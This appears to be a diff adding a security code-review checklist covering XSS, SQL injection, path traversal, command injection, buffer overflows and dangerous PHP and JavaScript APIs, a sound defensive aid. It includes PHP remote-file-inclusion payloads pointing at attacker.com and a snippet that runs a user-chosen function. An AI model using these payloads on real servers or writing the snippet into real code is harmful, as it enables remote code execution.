@@ -1,0 +1,56 @@
+* Check for vulnerablities such as :
+	- Unsecure configuration : by checking the file web.xml in java for example
+	- XSS : By checking parameters entered by users 
+	- SQL injection : by searching for methods like select, insert, update,...
+	- path traversal : look for APIs that are accessing the filesystem. The most commonly ones are :
+		- java.io.FileInputStream
+		- java.io.FileOutputStream
+		- java.io.FileReader
+		- java.io.FileWriter
+	- Network scan : by checking the usage of sockets and java.net.Socket in java. The input if it is user-controllable may allow an attacker to specify whatever host and port she wants to scan.
+	- Arbitray redirections : in javascript document.location = target; and in java : 
+		- httpResponse.Redirect
+		- javax.servlet.http.HttpServletResponse.sendRedirect
+		- javax.servlet.http.HttpServletResponse.setStatus
+		- javax.servlet.http.HttpServletResponse.addHeader
+	- OS command injection : by looking for words like system and Runtime.getRuntime().exec
+	- Backdoor passwords : passwords used by developers but not deleted. This can be done by checking the validateUser functions
+	- Buffer overflows : in C look for strcpy, strcat, memcpy, sprintf, ... Also when using "protected" functions like strncpy, it does not mean it is safe as in the following example : strncpy(strFileName, pszName, strlen(pszName));
+	- Format string : these are easy to find in native code.
+	- Information disclosure in comments
+	- Random numbers generation : in java java.util.Random() is vulnerable
+
+* In java, check the APIs that allow to extract parameters from user input like getParameter(), getHeader(), ... 
+!! SO Check always for APIs that their names start with get and set (and put)
+
+* In PHP, check the arrays $_GET, $_POST, $_REQUEST, $_SERVER, $_FILES, $_SESSION, $_GLOBALS, $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_COOKIE_VARS and $HTTP_SESSION_VARS
+
+* In PHP, when 2 brackets ([]) are given to a variable name it is converted automatically into arrays.
+
+* In PHP, it is possbile to include remote (local) files using these methods :
+	- SMB : \\attacker.com\file.php
+	- PHP input/output streams : php://filter/resource=http://attacker.com/file.php
+	- Compression streams : compress.zlib://http://attacker.com/file.php
+	- Audio streams : ogg://http://attacker.com/file.php
+
+* In php, this allows to execute PHP methos : <?php $var = $_GET['func']; $var(); ?>
+
+**** JavaScript *****
+ * The code review must include javascript code within responses and all .js files.
+ * Focus on APIs that read from DOM-based data and write/modify the current document such as :
+	- document.location
+	- document.URL
+	- document.open()
+	- document.URLUnencoded
+	- document.referrer
+	- document.write()
+	- document.writeln()
+	- document.body.innerHtml
+	- document.referer
+	- eval()
+	- window.location
+	- window.navigate()
+	- window.open()
+	- window.execScript()
+	- window.setInterval()
+	- window.setTimeout()
